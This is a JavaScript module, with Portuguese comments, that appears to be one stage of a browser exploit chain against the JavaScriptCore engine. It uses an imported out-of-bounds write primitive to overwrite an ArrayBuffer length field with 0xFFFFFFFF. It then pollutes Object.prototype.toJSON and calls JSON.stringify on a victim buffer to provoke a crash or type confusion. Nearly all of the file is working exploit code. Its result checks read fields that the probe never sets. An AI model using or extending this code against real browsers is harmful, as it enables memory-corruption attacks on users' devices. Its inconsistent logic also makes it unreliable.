// js/script3/testArrayBufferVictimCrash.mjs (Novo nome de arquivo)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "ArrayBufferVictimCrashTest_v28";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v28 = null;

// toJSON Ultra-Minimalista para este teste
function toJSON_V28_MinimalProbe() {
    toJSON_call_details_v28 = {
        probe_variant: "V28_MinimalProbe",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null
    };
    try {
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    // Para ser o mais leve possível, o objeto retornado também é mínimo.
    // O chamador inspecionará toJSON_call_details_v28.
    return { minimal_probe_executed: true }; 
}


export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.trigger`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando Crash com ArrayBuffer Vítima Pós-Corrupção ---`, "test", FNAME_CURRENT_TEST);
    document.title = `AB Victim Crash Test v28`;

    toJSON_call_details_v28 = null; // Resetar
    let errorCapturedMain = null;
    let stringifyOutput = null;
    let potentiallyCrashed = true; 
    let lastStep = "init";
    
    const mLengthOffsetInView = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    if (isNaN(mLengthOffsetInView)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_CURRENT_TEST);
        return { errorOccurred: new Error("Invalid M_LENGTH_OFFSET"), potentiallyCrashed: false, stringifyResult: null, toJSON_details: null };
    }
    // O offset 0x70 ou 0x7C, onde a estrutura fake 'm_length' foi plantada e depois sobrescrita criticamente
    const corruptionTargetOffsetInOOBAB = 0x58 + mLengthOffsetInView; 

    try {
        lastStep = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        // PASSO 1: Escrita OOB CRÍTICA em oob_array_buffer_real
        lastStep = "critical_oob_write";
        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        // PASSO 2: Criar victim_ab (ArrayBuffer) e tentar JSON.stringify com toJSON poluído
        lastStep = "victim_creation_and_stringify_attempt";
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`PASSO 2: victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_V28_MinimalProbe.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_MinimalProbe,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_MinimalProbe.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab)... (Este é o ponto esperado do Heisenbug Crash/Freeze)`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab); 
            potentiallyCrashed = false; // Se chegamos aqui, não crashou silenciosamente
            
            logS3(`  JSON.stringify(victim_ab) completou. Resultado (da toJSON): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da toJSON_V28_MinimalProbe: ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.error) {
                logS3(`    ERRO DENTRO da ${toJSON_V28_MinimalProbe.name}: ${toJSON_call_details_v28.error}`, "error", FNAME_CURRENT_TEST);
                if(!errorCapturedMain) errorCapturedMain = new Error(toJSON_call_details_v28.error);
            } else if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called) {
                logS3(`    ${toJSON_V28_MinimalProbe.name} foi chamada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "good", FNAME_CURRENT_TEST);
                if (toJSON_call_details_v28.this_type_in_toJSON !== "[object ArrayBuffer]") {
                    logS3(`      ALERTA: 'this' na toJSON NÃO ERA [object ArrayBuffer]! Tipo: ${toJSON_call_details_v28.this_type_in_toJSON}`, "critical", FNAME_CURRENT_TEST);
                    document.title = "TypeConfusion HEISENBUG?";
                }
            }
        } catch (e_str) {
            errorCapturedMain = e_str;
            potentiallyCrashed = false; 
            lastStep = "error_in_stringify";
            logS3(`   ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `ABVictim HEISENBUG: ${e_str.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${lastStep}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed, 
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v28 
    };
}
